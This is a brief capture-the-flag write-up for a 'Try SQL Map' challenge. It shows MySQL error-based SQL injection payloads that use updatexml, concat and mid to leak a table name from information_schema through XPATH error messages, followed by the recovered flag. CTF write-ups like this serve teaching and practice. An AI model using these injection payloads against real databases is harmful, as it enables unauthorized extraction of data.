# KMA CTF - Try SQL Map

**hints**: The length of flag table name > 32 characters

`Quick sqlmap` --> sql injection `error based`!

**Payload**:
```
updatexml(0,concat(0xa,(select table_name from information_schema.tables limit 1)),0)
```
**Result**:
```
XPATH syntax error: '
flahga123456789xxsxx012xxxxxxxx'
```

Because of the length, we use mid function in MySQL to cut the rest of flag that are not fullt obtain.

```
updatexml(0,concat(0xa,(select mid(table_name,20,25) from information_schema.tables limit 1)),0)
```
**Result**:
```
XPATH syntax error: '
x012xxxxxxxxx34567xx1'
```

Ok, merge it together: `flahga123456789xxsxx012xxxxxxxxx34567xx1`

**flag**: `KMACTF{flahga123456789xxsxx012xxxxxxxxx34567xx1}`
